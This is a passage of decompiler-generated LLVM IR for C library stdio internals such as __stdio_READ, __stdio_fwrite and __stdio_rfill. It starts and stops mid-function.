  %v1_804efbd10 = icmp eq i1 %v1_804efbb3, false
  br i1 %v1_804efbd10, label %dec_label_pc_804efa8, label %dec_label_pc_804efbf

dec_label_pc_804efa8:                             ; preds = %dec_label_pc_804efa1, %dec_label_pc_804efb5
  %v2_804efaf = phi i32 [ %v2_804efb8, %dec_label_pc_804efb5 ], [ %v2_804efaf1532, %dec_label_pc_804efa1 ]
  %v0_804efa8 = phi i32 [ %v1_804efb5, %dec_label_pc_804efb5 ], [ %v2_804efa1, %dec_label_pc_804efa1 ]
  %v1_804efa8 = inttoptr i32 %v0_804efa8 to i32*
  %v2_804efa8 = load i32, i32* %v1_804efa8, align 4
  store i32 %v2_804efa8, i32* %eax.global-to-local, align 4
  %v6_804efad = icmp ugt i32 %v2_804efa8, 127
  br i1 %v6_804efad, label %dec_label_pc_804ef7d, label %dec_label_pc_804efaf

dec_label_pc_804efaf:                             ; preds = %dec_label_pc_804efa8
  %v1_804efaf = trunc i32 %v2_804efa8 to i8
  %v3_804efaf = inttoptr i32 %v2_804efaf to i8*
  store i8 %v1_804efaf, i8* %v3_804efaf, align 1
  %v0_804efb1 = load i32, i32* %eax.global-to-local, align 4
  %v3_804efb1 = trunc i32 %v0_804efb1 to i8
  %v4_804efb1 = icmp eq i8 %v3_804efb1, 0
  br i1 %v4_804efb1, label %dec_label_pc_804ef8d, label %dec_label_pc_804efb5

dec_label_pc_804efb5:                             ; preds = %dec_label_pc_804efaf
  %v0_804efb5 = load i32, i32* %esi.global-to-local, align 4
  %v1_804efb5 = add i32 %v0_804efb5, 4
  store i32 %v1_804efb5, i32* %esi.global-to-local, align 4
  %v0_804efb8 = load i32, i32* %edx.global-to-local, align 4
  %v1_804efb8 = load i32, i32* %edi.global-to-local, align 4
  %v2_804efb8 = add i32 %v1_804efb8, %v0_804efb8
  store i32 %v2_804efb8, i32* %edx.global-to-local, align 4
  %v0_804efba = load i32, i32* @ecx, align 4
  %v1_804efba = add i32 %v0_804efba, -1
  %v8_804efba = icmp eq i32 %v1_804efba, 0
  store i32 %v1_804efba, i32* @ecx, align 4
  %v1_804efbd = icmp eq i1 %v8_804efba, false
  br i1 %v1_804efbd, label %dec_label_pc_804efa8, label %dec_label_pc_804efbf

dec_label_pc_804efbf:                             ; preds = %dec_label_pc_804efb5, %dec_label_pc_804efa1, %dec_label_pc_804ef8d
  %v0_804efc7 = phi i32 [ 0, %dec_label_pc_804ef8d ], [ %v2_804efa1, %dec_label_pc_804efa1 ], [ %v1_804efb5, %dec_label_pc_804efb5 ]
  %v0_804efc3 = phi i32 [ %v0_804efc3.pre, %dec_label_pc_804ef8d ], [ %v2_804efaf1532, %dec_label_pc_804efa1 ], [ %v2_804efb8, %dec_label_pc_804efb5 ]
  %v2_804efbf = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804efbf, i32* %eax.global-to-local, align 4
  %v12_804efc3 = icmp eq i32 %v0_804efc3, %v2_804efbf
  br i1 %v12_804efc3, label %dec_label_pc_804efca, label %dec_label_pc_804efc7

dec_label_pc_804efc7:                             ; preds = %dec_label_pc_804efbf
  %v1_804efc7 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804efc7 = inttoptr i32 %v1_804efc7 to i32*
  store i32 %v0_804efc7, i32* %v2_804efc7, align 4
  br label %dec_label_pc_804efca

dec_label_pc_804efca:                             ; preds = %dec_label_pc_804efbf, %dec_label_pc_804efc7
  %v0_804efca = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804efca, i32* %eax.global-to-local, align 4
  %v1_804efcc = load i32, i32* @ecx, align 4
  %v2_804efcc = sub i32 %v0_804efca, %v1_804efcc
  br label %dec_label_pc_804efce

dec_label_pc_804efce:                             ; preds = %dec_label_pc_804ef7d, %dec_label_pc_804efca
  %storemerge1 = phi i32 [ %v2_804efcc, %dec_label_pc_804efca ], [ -1, %dec_label_pc_804ef7d ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  store i32 %v0_804ef53, i32* @ebx, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v2_804efb8, { 0, 2, 1 }
  uselistorder i32 %v1_804efb5, { 0, 2, 1 }
  uselistorder i32 %v2_804efa1, { 1, 0, 2 }
  uselistorder i32 %v0_804efa4, { 1, 0 }
  uselistorder i32 %v2_804efaf1532, { 1, 0 }
  uselistorder i32 %v4_804ef57, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 6, 5, 7 }
  uselistorder i32 127, { 1, 4, 0, 3, 2 }
  uselistorder i32 84, { 3, 4, 0, 5, 1, 2 }
  uselistorder i8* null, { 5, 3, 6, 7, 2, 9, 0, 1, 8, 10, 11, 4 }
  uselistorder i32 %arg4, { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804efce, { 1, 0 }
  uselistorder label %dec_label_pc_804efca, { 1, 0 }
  uselistorder label %dec_label_pc_804efa8, { 1, 0 }
  uselistorder label %dec_label_pc_804efa1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ef97, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804efd8 = load i32, i32* @ebx, align 4
  store i32 %v0_804efd8, i32* %stack_var_-4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_804efde = ptrtoint i16* %arg1 to i32
  store i32 %v4_804efde, i32* @ebx, align 4
  %v1_804efe6 = bitcast i16* %arg1 to i8*
  %v2_804efe6 = load i8, i8* %v1_804efe6, align 1
  %v3_804efe6 = and i8 %v2_804efe6, 4
  %v4_804efe6 = icmp eq i8 %v3_804efe6, 0
  %v1_804efe9 = icmp eq i1 %v4_804efe6, false
  br i1 %v1_804efe9, label %dec_label_pc_804f018, label %dec_label_pc_804efeb

dec_label_pc_804efeb:                             ; preds = %entry
  %v2_804efeb = icmp slt i32 %arg3, 0
  %v1_804efed = icmp eq i1 %v2_804efeb, false
  br i1 %v1_804efed, label %dec_label_pc_804eff4, label %dec_label_pc_804efef

dec_label_pc_804efef:                             ; preds = %dec_label_pc_804efeb
  br label %dec_label_pc_804eff4

dec_label_pc_804eff4:                             ; preds = %dec_label_pc_804efeb, %dec_label_pc_804efef
  %v0_804eff5 = phi i32 [ %arg3, %dec_label_pc_804efeb ], [ 2147483647, %dec_label_pc_804efef ]
  %v1_804effa = add i32 %v4_804efde, 4
  %v2_804effa = inttoptr i32 %v1_804effa to i32*
  %v3_804effa = load i32, i32* %v2_804effa, align 4
  %v4_804effd = inttoptr i32 %arg2 to i32*
  %v5_804effd = call i32 @__libc_read(i32 %v3_804effa, i32* %v4_804effd, i32 %v0_804eff5, i32 0)
  store i32 %v5_804effd, i32* %eax.global-to-local, align 4
  %tmp13 = icmp slt i32 %v5_804effd, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_804f018, label %dec_label_pc_804f00a

dec_label_pc_804f00a:                             ; preds = %dec_label_pc_804eff4
  %v1_804f005 = icmp eq i32 %v5_804effd, 0
  %v4_804f008 = icmp eq i1 %v1_804f005, false
  %v0_804f012 = load i32, i32* @ebx, align 4
  %v1_804f012 = inttoptr i32 %v0_804f012 to i16*
  %v2_804f012 = load i16, i16* %v1_804f012, align 2
  br i1 %v4_804f008, label %dec_label_pc_804f012, label %dec_label_pc_804f00c

dec_label_pc_804f00c:                             ; preds = %dec_label_pc_804f00a
  %v3_804f00c = or i16 %v2_804f012, 4
  store i16 %v3_804f00c, i16* %v1_804f012, align 2
  %v0_804f01b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f018

dec_label_pc_804f012:                             ; preds = %dec_label_pc_804f00a
  %v3_804f012 = or i16 %v2_804f012, 8
  store i16 %v3_804f012, i16* %v1_804f012, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f018

dec_label_pc_804f018:                             ; preds = %dec_label_pc_804eff4, %entry, %dec_label_pc_804f00c, %dec_label_pc_804f012
  %v0_804f01b = phi i32 [ %v5_804effd, %dec_label_pc_804eff4 ], [ 0, %entry ], [ %v0_804f01b.pre, %dec_label_pc_804f00c ], [ 0, %dec_label_pc_804f012 ]
  %v2_804f01a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f01a, i32* @ebx, align 4
  ret i32 %v0_804f01b

; uselistorder directives
  uselistorder i16 %v2_804f012, { 1, 0 }
  uselistorder i32 %v5_804effd, { 1, 2, 0, 3 }
  uselistorder i32 2147483647, { 0, 2, 1, 3 }
  uselistorder i8 4, { 2, 1, 0, 3, 4 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f018, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804eff4, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f01c = load i32, i32* @ebp, align 4
  %v0_804f01d = load i32, i32* @edi, align 4
  %v0_804f01e = load i32, i32* @esi, align 4
  %v0_804f01f = load i32, i32* @ebx, align 4
  store i32 %v0_804f01f, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_804f02f = add i32 %arg3, 1
  %v2_804f02f = inttoptr i32 %v1_804f02f to i8*
  %v3_804f02f = load i8, i8* %v2_804f02f, align 1
  %v4_804f02f = and i8 %v3_804f02f, 2
  %v5_804f02f = icmp eq i8 %v4_804f02f, 0
  %v1_804f033 = icmp eq i1 %v5_804f02f, false
  br i1 %v1_804f033, label %dec_label_pc_804f0ea, label %dec_label_pc_804f039

dec_label_pc_804f039:                             ; preds = %entry
  %v1_804f039 = add i32 %arg3, 4
  %v2_804f039 = inttoptr i32 %v1_804f039 to i32*
  %v3_804f039 = load i32, i32* %v2_804f039, align 4
  %v13_804f039 = icmp eq i32 %v3_804f039, -2
  %v1_804f03d = add i32 %arg3, 16
  %v2_804f03d = inttoptr i32 %v1_804f03d to i32*
  %v3_804f03d = load i32, i32* %v2_804f03d, align 4
  store i32 %v3_804f03d, i32* @edx, align 4
  %v1_804f040 = add i32 %arg3, 12
  %v2_804f040 = inttoptr i32 %v1_804f040 to i32*
  %v3_804f040 = load i32, i32* %v2_804f040, align 4
  %v1_804f043 = icmp eq i1 %v13_804f039, false
  %v2_804f063 = sub i32 %v3_804f040, %v3_804f03d
  store i32 %v2_804f063, i32* %eax.global-to-local, align 4
  br i1 %v1_804f043, label %dec_label_pc_804f063, label %dec_label_pc_804f045

dec_label_pc_804f045:                             ; preds = %dec_label_pc_804f039
  %tmp22 = icmp ult i32 %v2_804f063, %arg2
  br i1 %tmp22, label %dec_label_pc_804f04d, label %dec_label_pc_804f04f

dec_label_pc_804f04d:                             ; preds = %dec_label_pc_804f045
  br label %dec_label_pc_804f04f

dec_label_pc_804f04f:                             ; preds = %dec_label_pc_804f045, %dec_label_pc_804f04d
  %storemerge = phi i32 [ %v2_804f063, %dec_label_pc_804f04d ], [ %arg2, %dec_label_pc_804f045 ]
  %v0_804f050 = phi i32 [ %v2_804f063, %dec_label_pc_804f04d ], [ %arg2, %dec_label_pc_804f045 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_804f053 = inttoptr i32 %v3_804f03d to i16*
  %v4_804f053 = call i32 @memcpy(i16* %v3_804f053, i32 %v0_804f050, i32 %v2_804f063)
  store i32 %v4_804f053, i32* %eax.global-to-local, align 4
  %v0_804f058 = load i32, i32* @ebx, align 4
  %v1_804f058 = add i32 %v0_804f058, 16
  %v2_804f058 = inttoptr i32 %v1_804f058 to i32*
  %v3_804f058 = load i32, i32* %v2_804f058, align 4
  %v4_804f058 = load i32, i32* @esi, align 4
  %v5_804f058 = add i32 %v4_804f058, %v3_804f058
  store i32 %v5_804f058, i32* %v2_804f058, align 4
  br label %dec_label_pc_804f102

dec_label_pc_804f063:                             ; preds = %dec_label_pc_804f039
  %v6_804f067 = icmp ult i32 %v2_804f063, %arg2
  br i1 %v6_804f067, label %dec_label_pc_804f0d1, label %dec_label_pc_804f069

dec_label_pc_804f069:                             ; preds = %dec_label_pc_804f063
  %v0_804f069 = load i32, i32* @ecx, align 4
  %v3_804f06d = inttoptr i32 %v3_804f03d to i16*
  %v4_804f06d = call i32 @memcpy(i16* %v3_804f06d, i32 %arg2, i32 %v0_804f069)
  store i32 %v4_804f06d, i32* %eax.global-to-local, align 4
  %v0_804f072 = load i32, i32* @ebx, align 4
  %v1_804f072 = add i32 %v0_804f072, 16
  %v2_804f072 = inttoptr i32 %v1_804f072 to i32*
  %v3_804f072 = load i32, i32* %v2_804f072, align 4
  %v4_804f072 = load i32, i32* @edi, align 4
  %v5_804f072 = add i32 %v4_804f072, %v3_804f072
  store i32 %v5_804f072, i32* %v2_804f072, align 4
  %v0_804f078 = load i32, i32* @ebx, align 4
  %v1_804f078 = add i32 %v0_804f078, 1
  %v2_804f078 = inttoptr i32 %v1_804f078 to i8*
  %v3_804f078 = load i8, i8* %v2_804f078, align 1
  %v4_804f078 = urem i8 %v3_804f078, 2
  %v5_804f078 = icmp eq i8 %v4_804f078, 0
  br i1 %v5_804f078, label %dec_label_pc_804f102, label %dec_label_pc_804f082

dec_label_pc_804f082:                             ; preds = %dec_label_pc_804f069
  %v0_804f082 = load i32, i32* @edx, align 4
  %v0_804f083 = load i32, i32* @edi, align 4
  %v4_804f087 = call i32 @memrchr(i8 10, i32 %v0_804f083, i32 %v0_804f082)
  store i32 %v4_804f087, i32* %eax.global-to-local, align 4
  %v1_804f08f = icmp eq i32 %v4_804f087, 0
  br i1 %v1_804f08f, label %dec_label_pc_804f102, label %dec_label_pc_804f093

dec_label_pc_804f093:                             ; preds = %dec_label_pc_804f082
  %v0_804f096 = load i32, i32* @ebx, align 4
  %v1_804f097 = call i32 @__stdio_wcommit(i32 %v0_804f096)
  store i32 %v1_804f097, i32* %eax.global-to-local, align 4
  %v1_804f09f = icmp eq i32 %v1_804f097, 0
  br i1 %v1_804f09f, label %dec_label_pc_804f102, label %dec_label_pc_804f0a3

dec_label_pc_804f0a3:                             ; preds = %dec_label_pc_804f093
  %v0_804f0a3 = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_804f0a3, %v1_804f097
  br i1 %tmp23, label %dec_label_pc_804f0a9, label %dec_label_pc_804f0ab

dec_label_pc_804f0a9:                             ; preds = %dec_label_pc_804f0a3
  br label %dec_label_pc_804f0ab

dec_label_pc_804f0ab:                             ; preds = %dec_label_pc_804f0a3, %dec_label_pc_804f0a9
  %storemerge24 = phi i32 [ %v1_804f097, %dec_label_pc_804f0a9 ], [ %v0_804f0a3, %dec_label_pc_804f0a3 ]
  %v0_804f0b2 = phi i32 [ %v1_804f097, %dec_label_pc_804f0a9 ], [ %v0_804f0a3, %dec_label_pc_804f0a3 ]
  store i32 %storemerge24, i32* %esi.global-to-local, align 4
  %v2_804f0ad = sub i32 %v0_804f0a3, %v0_804f0b2
  store i32 %v2_804f0ad, i32* %eax.global-to-local, align 4
  %v0_804f0af = load i32, i32* @ebp, align 4
  %v2_804f0af = add i32 %v0_804f0af, %v2_804f0ad
  store i32 %v2_804f0af, i32* %ebp.global-to-local, align 4
  %v4_804f0b6 = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v0_804f0b2, i32 %v2_804f0ad)
  store i32 %v4_804f0b6, i32* %eax.global-to-local, align 4
  store i32 %v4_804f0b6, i32* @edx, align 4
  %v1_804f0c0 = icmp eq i32 %v4_804f0b6, 0
  br i1 %v1_804f0c0, label %dec_label_pc_804f102, label %dec_label_pc_804f0c4

dec_label_pc_804f0c4:                             ; preds = %dec_label_pc_804f0ab
  %v0_804f0c4 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f0c4 = load i32, i32* %esi.global-to-local, align 4
  %v2_804f0c4 = sub i32 %v0_804f0c4, %v4_804f0b6
  %v2_804f0c8 = add i32 %v2_804f0c4, %v1_804f0c4
  store i32 %v2_804f0c8, i32* %eax.global-to-local, align 4
  %v0_804f0ca = load i32, i32* @ebx, align 4
  %v1_804f0ca = add i32 %v0_804f0ca, 16
  %v2_804f0ca = inttoptr i32 %v1_804f0ca to i32*
  %v3_804f0ca = load i32, i32* %v2_804f0ca, align 4
  %v5_804f0ca = sub i32 %v3_804f0ca, %v2_804f0c8
  store i32 %v5_804f0ca, i32* %v2_804f0ca, align 4
  %v0_804f0cd = load i32, i32* @edi, align 4
  %v1_804f0cd = load i32, i32* %eax.global-to-local, align 4
  %v2_804f0cd = sub i32 %v0_804f0cd, %v1_804f0cd
  store i32 %v2_804f0cd, i32* @edi, align 4
  br label %dec_label_pc_804f102

dec_label_pc_804f0d1:                             ; preds = %dec_label_pc_804f063
  %v2_804f0d1 = add i32 %arg3, 8
  %v3_804f0d1 = inttoptr i32 %v2_804f0d1 to i32*
  %v4_804f0d1 = load i32, i32* %v3_804f0d1, align 4
  %v15_804f0d1 = icmp eq i32 %v3_804f03d, %v4_804f0d1
  br i1 %v15_804f0d1, label %dec_label_pc_804f0ea, label %dec_label_pc_804f0d6

dec_label_pc_804f0d6:                             ; preds = %dec_label_pc_804f0d1
  %v1_804f0da = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_804f0da, i32* %eax.global-to-local, align 4
  %v1_804f0e2 = icmp eq i32 %v1_804f0da, 0
  br i1 %v1_804f0e2, label %dec_label_pc_804f0d6.dec_label_pc_804f0ea_crit_edge, label %dec_label_pc_804f0e6

dec_label_pc_804f0d6.dec_label_pc_804f0ea_crit_edge: ; preds = %dec_label_pc_804f0d6
  %v0_804f0ea.pre = load i32, i32* @edi, align 4
  %v0_804f0f2.pre = load i32, i32* @ebx, align 4
  %v2_804f0f9.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804f0ea

dec_label_pc_804f0e6:                             ; preds = %dec_label_pc_804f0d6
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804f102

dec_label_pc_804f0ea:                             ; preds = %dec_label_pc_804f0d6.dec_label_pc_804f0ea_crit_edge, %dec_label_pc_804f0d1, %entry
  %v2_804f0f9 = phi i32 [ %v2_804f0f9.pre, %dec_label_pc_804f0d6.dec_label_pc_804f0ea_crit_edge ], [ %v0_804f01f, %dec_label_pc_804f0d1 ], [ %v0_804f01f, %entry ]
  %v0_804f0f2 = phi i32 [ %v0_804f0f2.pre, %dec_label_pc_804f0d6.dec_label_pc_804f0ea_crit_edge ], [ %arg3, %dec_label_pc_804f0d1 ], [ %arg3, %entry ]
  %v0_804f0ea = phi i32 [ %v0_804f0ea.pre, %dec_label_pc_804f0d6.dec_label_pc_804f0ea_crit_edge ], [ %arg2, %dec_label_pc_804f0d1 ], [ %arg2, %entry ]
  store i32 %v2_804f0f9, i32* @ebx, align 4
  store i32 %v0_804f01d, i32* @edi, align 4
  %v4_804f0fd = inttoptr i32 %v0_804f0f2 to i16*
  %v5_804f0fd = call i32 @__stdio_WRITE(i16* %v4_804f0fd, i32 %v0_804f0ea, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804f0fd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f102

dec_label_pc_804f102:                             ; preds = %dec_label_pc_804f0ab, %dec_label_pc_804f093, %dec_label_pc_804f082, %dec_label_pc_804f069, %dec_label_pc_804f0e6, %dec_label_pc_804f0c4, %dec_label_pc_804f04f, %dec_label_pc_804f0ea
  %v0_804f105 = load i32, i32* @edi, align 4
  store i32 %v0_804f105, i32* %eax.global-to-local, align 4
  %v2_804f107 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f107, i32* @ebx, align 4
  store i32 %v0_804f01e, i32* @esi, align 4
  store i32 %v0_804f01d, i32* @edi, align 4
  store i32 %v0_804f01c, i32* @ebp, align 4
  ret i32 %v0_804f105

; uselistorder directives
  uselistorder i32 %v2_804f0c8, { 1, 0 }
  uselistorder i32 %v4_804f0b6, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804f0ad, { 1, 0, 2 }
  uselistorder i32 %v0_804f0a3, { 3, 0, 1, 2 }
  uselistorder i32 %v2_804f063, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v0_804f01d, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 21, 22, 17, 18, 19, 20, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i8 10, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 0, 1, 5, 6, 2, 3, 13, 4, 7, 8, 9, 14, 10, 11, 15, 16, 17, 12 }
  uselistorder i8 2, { 4, 13, 5, 0, 1, 2, 3, 12, 18, 14, 6, 15, 7, 8, 9, 10, 16, 17, 11 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 4, 5, 6, 3, 0, 1, 2, 7 }
  uselistorder label %dec_label_pc_804f102, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_804f0ab, { 1, 0 }
  uselistorder label %dec_label_pc_804f04f, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_804f10c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804f114 = add i32 %arg1, 8
  %v2_804f114 = inttoptr i32 %v1_804f114 to i32*
  %v3_804f114 = load i32, i32* %v2_804f114, align 4
  store i32 %v3_804f114, i32* %edx.global-to-local, align 4
  %v1_804f117 = add i32 %arg1, 12
  %v2_804f117 = inttoptr i32 %v1_804f117 to i32*
  %v3_804f117 = load i32, i32* %v2_804f117, align 4
  %v2_804f11a = sub i32 %v3_804f117, %v3_804f114
  %v3_804f11f = inttoptr i32 %arg1 to i16*
  %v4_804f11f = call i32 @__stdio_READ(i16* %v3_804f11f, i32 %v3_804f114, i32 %v2_804f11a)
  %v0_804f124 = load i32, i32* @ebx, align 4
  %v1_804f124 = add i32 %v0_804f124, 8
  %v2_804f124 = inttoptr i32 %v1_804f124 to i32*
  %v3_804f124 = load i32, i32* %v2_804f124, align 4
  store i32 %v3_804f124, i32* %edx.global-to-local, align 4
  %v2_804f127 = add i32 %v0_804f124, 16
  %v3_804f127 = inttoptr i32 %v2_804f127 to i32*
  store i32 %v3_804f124, i32* %v3_804f127, align 4
  %v0_804f12a = load i32, i32* %edx.global-to-local, align 4
  %v2_804f12a = add i32 %v0_804f12a, %v4_804f11f
  store i32 %v2_804f12a, i32* %edx.global-to-local, align 4
  %v1_804f12c = load i32, i32* @ebx, align 4
  %v2_804f12c = add i32 %v1_804f12c, 20
  %v3_804f12c = inttoptr i32 %v2_804f12c to i32*
  store i32 %v2_804f12a, i32* %v3_804f12c, align 4
  store i32 %v0_804f10c, i32* @ebx, align 4
  ret i32 %v4_804f11f

; uselistorder directives
  uselistorder i32 %v4_804f11f, { 1, 0 }
  uselistorder i32 (i16*, i32, i32)* @__stdio_READ, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804f134 = load i32, i32* @ebx, align 4
  %v4_804f138 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f138, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_804f140 = bitcast i16* %arg1 to i32*
  %v2_804f140 = load i32, i32* %v1_804f140, align 4
  %v1_804f142 = urem i32 %v2_804f140, 65536
  %v2_804f145 = and i32 %v1_804f142, %arg2
  %v3_804f145 = icmp eq i32 %v2_804f145, 0
  %v1_804f147 = icmp eq i1 %v3_804f145, false
  br i1 %v1_804f147, label %dec_label_pc_804f156, label %dec_label_pc_804f149

dec_label_pc_804f149:                             ; preds = %entry
  %v1_804f149 = and i32 %v2_804f140, 2176
  %v2_804f149 = icmp eq i32 %v1_804f149, 0
  %v1_804f14f = icmp eq i1 %v2_804f149, false
  br i1 %v1_804f14f, label %dec_label_pc_804f15d, label %dec_label_pc_804f151

dec_label_pc_804f151:                             ; preds = %dec_label_pc_804f149
  %v2_804f151 = or i32 %v2_804f140, %arg2
  %v1_804f153 = trunc i32 %v2_804f151 to i16
  store i16 %v1_804f153, i16* %arg1, align 2
  %v0_804f156.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f156

dec_label_pc_804f156:                             ; preds = %entry, %dec_label_pc_804f151
  %v0_804f178 = phi i32 [ %v4_804f138, %entry ], [ %v0_804f156.pre, %dec_label_pc_804f151 ]
  %v1_804f156 = inttoptr i32 %v0_804f178 to i16*
  %v2_804f156 = load i16, i16* %v1_804f156, align 2
  %v2_804f159 = and i16 %v2_804f156, 16
  %v3_804f159 = icmp eq i16 %v2_804f159, 0
  br i1 %v3_804f159, label %dec_label_pc_804f171, label %dec_label_pc_804f15d

dec_label_pc_804f15d:                             ; preds = %dec_label_pc_804f156, %dec_label_pc_804f149
  %v1_804f15d = call i32 @__errno_location(i32 %v0_804f134)
  %v1_804f162 = inttoptr i32 %v1_804f15d to i32*
  store i32 9, i32* %v1_804f162, align 4
  br label %dec_label_pc_804f168

dec_label_pc_804f168:                             ; preds = %dec_label_pc_804f175, %dec_label_pc_804f15d
  %v0_804f168 = load i32, i32* @ebx, align 4
  %v1_804f168 = inttoptr i32 %v0_804f168 to i16*
  %v2_804f168 = load i16, i16* %v1_804f168, align 2
  %v3_804f168 = or i16 %v2_804f168, 8
  store i16 %v3_804f168, i16* %v1_804f168, align 2
  br label %dec_label_pc_804f195

dec_label_pc_804f171:                             ; preds = %dec_label_pc_804f156
  %v2_804f171 = and i16 %v2_804f156, 64
  %v3_804f171 = icmp eq i16 %v2_804f171, 0
  br i1 %v3_804f171, label %dec_label_pc_804f18f, label %dec_label_pc_804f175

dec_label_pc_804f175:                             ; preds = %dec_label_pc_804f171
  %v2_804f179 = call i32 @__stdio_wcommit(i32 %v0_804f178)
  %v1_804f181 = icmp eq i32 %v2_804f179, 0
  %v1_804f183 = icmp eq i1 %v1_804f181, false
  br i1 %v1_804f183, label %dec_label_pc_804f168, label %dec_label_pc_804f185

dec_label_pc_804f185:                             ; preds = %dec_label_pc_804f175
  %v0_804f185 = load i32, i32* @ebx, align 4
  %v1_804f185 = inttoptr i32 %v0_804f185 to i16*
  %v2_804f185 = load i16, i16* %v1_804f185, align 2
  %v3_804f185 = and i16 %v2_804f185, -65
  store i16 %v3_804f185, i16* %v1_804f185, align 2
  %v0_804f189 = load i32, i32* @ebx, align 4
  %v1_804f189 = add i32 %v0_804f189, 8
  %v2_804f189 = inttoptr i32 %v1_804f189 to i32*
  %v3_804f189 = load i32, i32* %v2_804f189, align 4
  %v2_804f18c = add i32 %v0_804f189, 28
  %v3_804f18c = inttoptr i32 %v2_804f18c to i32*
  store i32 %v3_804f189, i32* %v3_804f18c, align 4
  %v0_804f18f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f18f

dec_label_pc_804f18f:                             ; preds = %dec_label_pc_804f171, %dec_label_pc_804f185
  %v9_804f18f = phi i32 [ %v0_804f178, %dec_label_pc_804f171 ], [ %v0_804f18f.pre, %dec_label_pc_804f185 ]
  %v1_804f18f = inttoptr i32 %v9_804f18f to i16*
  %v2_804f18f = load i16, i16* %v1_804f18f, align 2
  %v3_804f18f = or i16 %v2_804f18f, 1
  store i16 %v3_804f18f, i16* %v1_804f18f, align 2
  br label %dec_label_pc_804f195

dec_label_pc_804f195:                             ; preds = %dec_label_pc_804f168, %dec_label_pc_804f18f
  %storemerge = phi i32 [ 0, %dec_label_pc_804f18f ], [ -1, %dec_label_pc_804f168 ]
  store i32 %v0_804f134, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_804f140, { 1, 2, 0 }
  uselistorder i32 %v0_804f134, { 1, 0 }
  uselistorder i16 1, { 1, 2, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f195, { 1, 0 }
  uselistorder label %dec_label_pc_804f18f, { 1, 0 }
  uselistorder label %dec_label_pc_804f156, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804f19c = load i32, i32* @ebx, align 4
